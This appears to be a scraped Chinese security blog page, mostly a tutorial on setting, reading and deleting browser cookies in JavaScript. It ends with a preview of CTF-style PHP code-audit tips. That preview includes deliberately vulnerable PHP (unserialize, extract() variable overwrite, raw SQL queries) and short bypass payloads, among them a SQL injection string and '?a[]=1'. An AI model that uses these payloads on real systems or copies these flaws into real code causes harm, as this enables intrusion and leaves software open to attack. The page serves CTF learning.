+1234567891011121314&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function addcookie(name,value,expireHours)&#123;      var cookieString=name+&quot;=&quot;+escape(value);      //判断是否设置过期时间      if(expireHours&gt;0)&#123;             var date=new Date();             date.setTime(date.getTime+expireHours*3600*1000);             cookieString=cookieString+&quot;; expire=&quot;+date.toGMTString();      &#125;      document.cookie=cookieString;&#125;//--&gt;&lt;/script&gt;
+2．获取指定名称的cookie值：getcookie(name)该函数返回名称为name的cookie值，如果不存在则返回空，其实现如下：
+12345678910111213&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function getcookie(name)&#123;      var strcookie=document.cookie;      var arrcookie=strcookie.split(&quot;; &quot;);      for(var i=0;i&lt;arrcookie.length;i++)&#123;            var arr=arrcookie[i].split(&quot;=&quot;);            if(arr[0]==name)return arr[1];      &#125;      return &quot;&quot;;&#125;//--&gt;&lt;/script&gt;
+3．删除指定名称的cookie：deletecookie(name)该函数可以删除指定名称的cookie，其实现如下：
+123456789&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function deletecookie(name)&#123;       var date=new Date();       date.setTime(date.getTime()-10000);       document.cookie=name+&quot;=v; expire=&quot;+date.toGMTString();&#125;//--&gt;&lt;/script&gt; 
+
+也可以用另一种网上流传的:
+12345678910111213141516171819202122232425&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;function SetCookie(name,value)//两个参数，一个是cookie的名子，一个是值&#123;    var Days = 30; //此 cookie 将被保存 30 天    var exp  = new Date();    //new Date(&quot;December 31, 9998&quot;);    exp.setTime(exp.getTime() + Days*24*60*60*1000);    document.cookie = name + &quot;=&quot;+ escape (value) + &quot;;expires=&quot; + exp.toGMTString();&#125;function getCookie(name)//取cookies函数       &#123;    var arr = document.cookie.match(new RegExp(&quot;(^| )&quot;+name+&quot;=([^;]*)(;|$)&quot;));     if(arr != null) return unescape(arr[2]); return null;&#125;function delCookie(name)//删除cookie&#123;    var exp = new Date();    exp.setTime(exp.getTime() - 1);    var cval=getCookie(name);    if(cval!=null) document.cookie= name + &quot;=&quot;+cval+&quot;;expires=&quot;+exp.toGMTString();&#125;SetCookie (&quot;xiaoqi&quot;, &quot;3&quot;)alert(getCookie(&#x27;xiaoqi&#x27;));&lt;/script&gt;
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h3 id="0x01-什么是cookie"><a href="#0x01-什么是cookie" class="headerlink" title="0x01 什么是cookie"></a>0x01 什么是cookie</h3><p>cookie是浏览器提供的一种机制，它将document对象的cookie属性提供给JavaScript。<br>可以由JavaScript对其进行控制，而并不是JavaScript本身的性质。</p>
+<p>cookie是存于用户硬盘的一个文件，这个文件通常对应于一个域名，当浏览器再次访问这个域名时，便使这个cookie可用。<br>因此，cookie可以跨越一个域名下的多个网页，但不能跨越多个域名使用。<br>不同的浏览器对cookie的实现也不一样，但其性质是相同的。<br>cookie机制将信息存储于用户硬盘，因此可以作为全局变量，这是它最大的一个优点。<br>它可以用于以下几种场合：</p>
+<ul>
+<li>保存用户登录状态。例如将用户id存储于一个cookie内，这样当用户下次访问该页面时就不需要重新登录了，现在很多论坛和社区都提供这样的功能。cookie还可以设置过期时间，当超过时间期限后，cookie就会自动消失。因此，系统往往可以提示用户保持登录状态的时间：常见选项有一个月、三个月、一年等。</li>
+<li>跟踪用户行为。例如一个天气预报网站，能够根据用户选择的地区显示当地的天气情况。如果每次都需要选择所在地是烦琐的，当利用了cookie后就会显得很人性化了，系统能够记住上一次访问的地区，当下次再打开该页面时，它就会自动显示上次用户所在地区的天气情况。因为一切都是在后台完成，所以这样的页面就像为某个用户所定制的一样，使用起来非常方便。</li>
+<li>定制页面。如果网站提供了换肤或更换布局的功能，那么可以使用cookie来记录用户的选项，例如：背景色、分辨率等。当用户下次访问时，仍然可以保存上一次访问的界面风格。</li>
+<li>创建购物车。正如在前面的例子中使用cookie来记录用户需要购买的商品一样，在结账的时候可以统一提交。例如淘宝网就使用cookie记录了用户曾经浏览过的商品，方便随时进行比较。</li>
+</ul>
+<p>当然，上述应用仅仅是cookie能完成的部分应用，还有更多的功能需要全局变量。cookie的缺点主要集中于安全性和隐私保护.<br>主要包括以下几种：</p>
+<ul>
+<li>cookie可能被禁用。当用户非常注重个人隐私保护时，他很可能禁用浏览器的cookie功能；</li>
+<li>cookie是与浏览器相关的。这意味着即使访问的是同一个页面，不同浏览器之间所保存的cookie也是不能互相访问的；</li>
+<li>cookie可能被删除。因为每个cookie都是硬盘上的一个文件，因此很有可能被用户删除；</li>
+<li>cookie安全性不够高。所有的cookie都是以纯文本的形式记录于文件中，因此如果要保存用户名密码等信息时，最好事先经过加密处理。<h3 id="0x02-设置cookie"><a href="#0x02-设置cookie" class="headerlink" title="0x02 设置cookie"></a>0x02 设置cookie</h3></li>
+</ul>
+<p>每个cookie都是一个名/值对，可以把下面这样一个字符串赋值给<code>document.cookie</code>：<br><code>document.cookie=&quot;userId=828&quot;;</code><br>如果要一次存储多个名/值对，可以使用分号加空格（; ）隔开，例如：<br><code>document.cookie=&quot;userId=828; userName=hulk&quot;;</code><br>在cookie的名或值中不能使用分号（;）、逗号（,）、等号（=）以及空格。<br>在cookie的名中做到这点很容易，但要保存的值是不确定的。如何来存储这些值呢？<br>方法是用escape()函数进行编码，它能将一些特殊符号使用十六进制表示，例如空格将会编码为“20%”，从而可以存储于cookie值中，而且使用此种方案还可以避免中文乱码的出现。<br>例如：<br><code>document.cookie=&quot;str=&quot;+escape(&quot;I love ajax&quot;);</code><br>相当于：<br><code>document.cookie=&quot;str=I%20love%20ajax&quot;;</code><br>当使用escape()编码后，在取出值以后需要使用unescape()进行解码才能得到原来的cookie值。<br>尽管document.cookie看上去就像一个属性，可以赋不同的值。但它和一般的属性不一样，改变它的赋值并不意味着丢失原来的值，例如连续执行下面两条语句：<br><code>document.cookie=&quot;userId=828&quot;;</code><br><code>document.cookie=&quot;userName=hulk&quot;;</code><br>这时浏览器将维护两个cookie，分别是userId和userName，因此给<code>document.cookie</code>赋值更像执行类似这样的语句：<br><code>document.addcookie(&quot;userId=828&quot;);</code><br><code>document.addcookie(&quot;userName=hulk&quot;);</code><br>事实上，浏览器就是按照这样的方式来设置cookie的，如果要改变一个cookie的值，只需重新赋值，例如：<br><code>document.cookie=&quot;userId=929&quot;;</code><br>这样就将名为userId的cookie值设置为了929。</p>
+<h3 id="0x03-获取cookie的值"><a href="#0x03-获取cookie的值" class="headerlink" title="0x03 获取cookie的值"></a>0x03 获取cookie的值</h3><p>下面介绍如何获取cookie的值。cookie的值可以由<code>document.cookie</code>直接获得：<br><code>var strcookie=document.cookie;</code><br>这将获得以分号隔开的多个名/值对所组成的字符串，这些名/值对包括了该域名下的所有cookie。<br>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">document.cookie=&quot;userId=828&quot;;</span><br><span class="line">document.cookie=&quot;userName=hulk&quot;;</span><br><span class="line">var strcookie=document.cookie;</span><br><span class="line">alert(strcookie);</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只能够一次获取所有的cookie值，而不能指定cookie名称来获得指定的值，这正是处理cookie值最麻烦的一部分。用户必须自己分析这个字符串，来获取指定的cookie值，例如，要获取userId的值，可以这样实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">//设置两个cookie</span><br><span class="line">document.cookie=&quot;userId=828&quot;;</span><br><span class="line">document.cookie=&quot;userName=hulk&quot;;</span><br><span class="line">//获取cookie字符串</span><br><span class="line">var strcookie=document.cookie;</span><br><span class="line">//将多cookie切割为多个名/值对</span><br><span class="line">var arrcookie=strcookie.split(&quot;; &quot;);</span><br><span class="line">var userId;</span><br><span class="line">//遍历cookie数组，处理每个cookie对</span><br><span class="line">for(var i=0;i&lt;arrcookie.length;i++)&#123;</span><br><span class="line">      var arr=arrcookie[i].split(&quot;=&quot;);</span><br><span class="line">      //找到名称为userId的cookie，并返回它的值</span><br><span class="line">      if(&quot;userId&quot;==arr[0])&#123;</span><br><span class="line">             userId=arr[1];</span><br><span class="line">             break;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(userId);</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样就得到了单个cookie的值</p>
+<p>用类似的方法，可以获取一个或多个cookie的值，其主要的技巧仍然是字符串和数组的相关操作。</p>
+<h3 id="0x04-给cookie设置终止日期"><a href="#0x04-给cookie设置终止日期" class="headerlink" title="0x04 给cookie设置终止日期"></a>0x04 给cookie设置终止日期</h3><p>到现在为止，所有的cookie都是单会话cookie，即浏览器关闭后这些cookie将会丢失，事实上这些cookie仅仅是存储在内存中，而没有建立相应的硬盘文件。<br>在实际开发中，cookie常常需要长期保存，例如保存用户登录的状态。这可以用下面的选项来实现：<br><code>document.cookie=&quot;userId=828; expires=GMT_String&quot;;</code><br>其中GMT_String是以GMT格式表示的时间字符串，这条语句就是将userId这个cookie设置为GMT_String表示的过期时间，超过这个时间，cookie将消失，不可访问。<br>例如：如果要将cookie设置为10天后过期，可以这样实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">//获取当前时间</span><br><span class="line">var date=new Date();</span><br><span class="line">var expireDays=10;</span><br><span class="line">//将date设置为10天以后的时间</span><br><span class="line">date.setTime(date.getTime()+expireDays*24*3600*1000);</span><br><span class="line">//将userId和userName两个cookie设置为10天后过期</span><br><span class="line">document.cookie=&quot;userId=828; userName=hulk; expire=&quot;+date.toGMTString();</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-删除cookie"><a href="#0x05-删除cookie" class="headerlink" title="0x05 删除cookie"></a>0x05 删除cookie</h3><p>为了删除一个cookie，可以将其过期时间设定为一个过去的时间，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">//获取当前时间</span><br><span class="line">var date=new Date();</span><br><span class="line">//将date设置为过去的时间</span><br><span class="line">date.setTime(date.getTime()-10000);</span><br><span class="line">//将userId这个cookie删除</span><br><span class="line">document.cookie=&quot;userId=828; expire=&quot;+date.toGMTString();</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x06-指定可访问cookie的路径"><a href="#0x06-指定可访问cookie的路径" class="headerlink" title="0x06 指定可访问cookie的路径"></a>0x06 指定可访问cookie的路径</h3><p>默认情况下，如果在某个页面创建了一个cookie，那么该页面所在目录中的其他页面也可以访问该cookie。如果这个目录下还有子目录，则在子目录中也可以访问。例如在<code>www.xxxx.com/html/a.html</code>中所创建的cookie，可以被<code>www.xxxx.com/html/b.html</code>或<code>www.xxx.com/ html/ some/c.html</code>所访问，但不能被<code>www.xxxx.com/d.html</code>访问。<br>为了控制cookie可以访问的目录，需要使用path参数设置cookie，语法如下：<br><code>document.cookie=&quot;name=value; path=cookieDir&quot;;</code><br>其中cookieDir表示可访问cookie的目录。例如：<br><code>document.cookie=&quot;userId=320; path=/shop&quot;;</code><br>就表示当前cookie仅能在shop目录下使用。<br>如果要使cookie在整个网站下可用，可以将cookie_dir指定为根目录，例如：<br><code>document.cookie=&quot;userId=320; path=/&quot;;</code></p>
+<h3 id="0x07-指定可访问cookie的主机名"><a href="#0x07-指定可访问cookie的主机名" class="headerlink" title="0x07 指定可访问cookie的主机名"></a>0x07 指定可访问cookie的主机名</h3><p>和路径类似，主机名是指同一个域下的不同主机，例如：<code>www.google.com</code>和<code>gmail.google.com</code>就是两个不同的主机名。默认情况下，一个主机中创建的cookie在另一个主机下是不能被访问的，但可以通过domain参数来实现对其的控制，其语法格式为：<br><code>document.cookie=&quot;name=value; domain=cookieDomain&quot;;</code><br>以google为例，要实现跨主机访问，可以写为：<br><code>document.cookie=&quot;name=value;domain=.google.com&quot;;</code><br>这样，所有google.com下的主机都可以访问该cookie。</p>
+<h3 id="0x08-综合示例：构造通用的cookie处理函数"><a href="#0x08-综合示例：构造通用的cookie处理函数" class="headerlink" title="0x08 综合示例：构造通用的cookie处理函数"></a>0x08 综合示例：构造通用的cookie处理函数</h3><p>cookie的处理过程比较复杂，并具有一定的相似性。因此可以定义几个函数来完成cookie的通用操作，从而实现代码的复用。下面列出了常用的cookie操作及其函数实现。</p>
+<h4 id="1．添加一个cookie：addcookie-name-value-expireHours"><a href="#1．添加一个cookie：addcookie-name-value-expireHours" class="headerlink" title="1．添加一个cookie：addcookie(name,value,expireHours)"></a>1．添加一个cookie：addcookie(name,value,expireHours)</h4><p>该函数接收3个参数：cookie名称，cookie值，以及在多少小时后过期。这里约定expireHours为0时不设定过期时间，即当浏览器关闭时cookie自动消失。该函数实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">function addcookie(name,value,expireHours)&#123;</span><br><span class="line">      var cookieString=name+&quot;=&quot;+escape(value);</span><br><span class="line">      //判断是否设置过期时间</span><br><span class="line">      if(expireHours&gt;0)&#123;</span><br><span class="line">             var date=new Date();</span><br><span class="line">             date.setTime(date.getTime+expireHours*3600*1000);</span><br><span class="line">             cookieString=cookieString+&quot;; expire=&quot;+date.toGMTString();</span><br><span class="line">      &#125;</span><br><span class="line">      document.cookie=cookieString;</span><br><span class="line">&#125;</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2．获取指定名称的cookie值：getcookie-name"><a href="#2．获取指定名称的cookie值：getcookie-name" class="headerlink" title="2．获取指定名称的cookie值：getcookie(name)"></a>2．获取指定名称的cookie值：getcookie(name)</h4><p>该函数返回名称为name的cookie值，如果不存在则返回空，其实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">function getcookie(name)&#123;</span><br><span class="line">      var strcookie=document.cookie;</span><br><span class="line">      var arrcookie=strcookie.split(&quot;; &quot;);</span><br><span class="line">      for(var i=0;i&lt;arrcookie.length;i++)&#123;</span><br><span class="line">            var arr=arrcookie[i].split(&quot;=&quot;);</span><br><span class="line">            if(arr[0]==name)return arr[1];</span><br><span class="line">      &#125;</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3．删除指定名称的cookie：deletecookie-name"><a href="#3．删除指定名称的cookie：deletecookie-name" class="headerlink" title="3．删除指定名称的cookie：deletecookie(name)"></a>3．删除指定名称的cookie：deletecookie(name)</h4><p>该函数可以删除指定名称的cookie，其实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">function deletecookie(name)&#123;</span><br><span class="line">       var date=new Date();</span><br><span class="line">       date.setTime(date.getTime()-10000);</span><br><span class="line">       document.cookie=name+&quot;=v; expire=&quot;+date.toGMTString();</span><br><span class="line">&#125;</span><br><span class="line">//--&gt;</span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p>也可以用另一种网上流传的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">function SetCookie(name,value)//两个参数，一个是cookie的名子，一个是值</span><br><span class="line">&#123;</span><br><span class="line">    var Days = 30; //此 cookie 将被保存 30 天</span><br><span class="line">    var exp  = new Date();    //new Date(&quot;December 31, 9998&quot;);</span><br><span class="line">    exp.setTime(exp.getTime() + Days*24*60*60*1000);</span><br><span class="line">    document.cookie = name + &quot;=&quot;+ escape (value) + &quot;;expires=&quot; + exp.toGMTString();</span><br><span class="line">&#125;</span><br><span class="line">function getCookie(name)//取cookies函数       </span><br><span class="line">&#123;</span><br><span class="line">    var arr = document.cookie.match(new RegExp(&quot;(^| )&quot;+name+&quot;=([^;]*)(;|$)&quot;));</span><br><span class="line">     if(arr != null) return unescape(arr[2]); return null;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function delCookie(name)//删除cookie</span><br><span class="line">&#123;</span><br><span class="line">    var exp = new Date();</span><br><span class="line">    exp.setTime(exp.getTime() - 1);</span><br><span class="line">    var cval=getCookie(name);</span><br><span class="line">    if(cval!=null) document.cookie= name + &quot;=&quot;+cval+&quot;;expires=&quot;+exp.toGMTString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SetCookie (&quot;xiaoqi&quot;, &quot;3&quot;)</span><br><span class="line">alert(getCookie(&#x27;xiaoqi&#x27;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Oct 03 2016 21:00:00 GMT+0800">2016-10-03</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/XSS/">XSS</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/XSS%E5%88%A9%E7%94%A8%E4%B9%8BCookie%20/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1TIPS/">
+                        PHP代码审计TIPS
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;);   die(&quot;have a fun!!&quot;);&#125;foreach([$_GET, $_POST] as $global_var) &#123;     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     &#125; &#125; function is_palindrome_number($number) &#123;     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; if(is_numeric($_REQUEST[&#x27;number&#x27;]))&#123;   $info=&quot;sorry, you cann&#x27;t input a number!&quot;;&#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;])))&#123;     $info = &quot;number must be equal to it&#x27;s integer!! &quot;;  &#125;else&#123;     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;     else     &#123;          if(is_palindrome_number($req[&quot;number&quot;]))&#123;              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;           &#125;          else          &#123;             $info=$flag;          &#125;     &#125;&#125;echo $info;
+
+
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php    include &#x27;common.php&#x27;;    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);    //把一个或多个数组合并为一个数组    class db    &#123;        public $where;        function __wakeup()        &#123;            if(!empty($this-&gt;where))            &#123;                $this-&gt;select($this-&gt;where);            &#125;        &#125;        function select($where)        &#123;            $sql = mysql_query(&#x27;select * from user where &#x27;.$where);            //函数执行一条 MySQL 查询。            return @mysql_fetch_array($sql);            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false        &#125;    &#125;    if(isset($requset[&#x27;token&#x27;]))    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。    &#123;        $login = unserialize(gzuncompress(base64_decode($requset[&#x27;token&#x27;])));        //gzuncompress:进行字符串压缩        //unserialize: 将已序列化的字符串还原回 PHP 的值        $db = new db();        $row = $db-&gt;select(&#x27;user=\&#x27;&#x27;.mysql_real_escape_string($login[&#x27;user&#x27;]).&#x27;\&#x27;&#x27;);        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。        if($login[&#x27;user&#x27;] === &#x27;ichunqiu&#x27;)        &#123;            echo $flag;        &#125;else if($row[&#x27;pass&#x27;] !== $login[&#x27;pass&#x27;])&#123;            echo &#x27;unserialize injection!!&#x27;;        &#125;else&#123;            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;        &#125;    &#125;else&#123;        header(&#x27;Location: index.php?error=1&#x27;);    &#125;?&gt; 
+
+12345&lt;?php$arr = array(&#x27;user&#x27; =&gt; &#x27;ichunqiu&#x27;);$a = base64_encode(gzcompress(serialize($arr)));echo $a;?&gt;
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phperror_reporting(0);if (!isset($_POST[&#x27;uname&#x27;]) || !isset($_POST[&#x27;pwd&#x27;])) &#123;    echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;/form&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    echo &#x27;&lt;!--source: source.txt--&gt;&#x27;.&quot;&lt;br/&gt;&quot;;    die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;      if (is_array($StrValue))&#123;//检测变量是否是数组        $StrValue=implode($StrValue);//返回由数组元素组合成的字符串    &#125;    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   //匹配成功一次后就会停止匹配        print &quot;水可载舟，亦可赛艇！&quot;;        exit();    &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value)&#123; //遍历数组    AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con)&#123;    die(&#x27;Could not connect: &#x27; . mysql_error());&#125;$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);//设置活动的 MySQL 数据库$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;$query = mysql_query($sql); //执行一条 MySQL 查询if (mysql_num_rows($query) == 1) &#123; //返回结果集中行的数目    $key = mysql_fetch_array($query);//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false    if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123;        print &quot;CTF&#123;XXXXXX&#125;&quot;;    &#125;else&#123;        print &quot;亦可赛艇！&quot;;    &#125;&#125;else&#123;    print &quot;一颗赛艇！&quot;;&#125;mysql_close($con);?&gt;
+
+1admin&#x27; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -
+
+1234567891011121314$flag=&#x27;xxx&#x27;; extract($_GET); if(isset($shiyan)) &#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &#123;         echo&#x27;ctf&#123;xxx&#125;&#x27;;     &#125;   else   &#123;     echo&#x27;Oh.no&#x27;;   &#125;    &#125;
+
+123456变量覆盖漏洞PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。file_get_contents：远程获取获取文件，若没有则为空构造shiyan=&amp;flag=1
+
+123456789101112131415161718192021222324&lt;?php if (isset ($_GET[&#x27;password&#x27;])) &#123;  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)  &#123;    echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;  &#125;  else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999)   &#123;     if (strpos ($_GET[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE)       &#123;      die(&#x27;Flag: &#x27; . $flag);      &#125;      else      &#123;        echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;);        &#125;      &#125;     else      &#123;        echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;;       &#125;   &#125; ?&gt;
+
+123ereg漏洞payload：1e9%00*-*正则%00截断
+1234567if (isset($_GET[&#x27;a&#x27;])) &#123;      if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0)     //比较两个字符串（区分大小写）         die(&#x27;Flag: &#x27;.$flag);      else          print &#x27;离成功更近一步了&#x27;;  &#125;
+
+1payload:?a[]=1
+
+漏洞原理
+1在5.3的版本之后使用strcmp函数比较会返回0
+
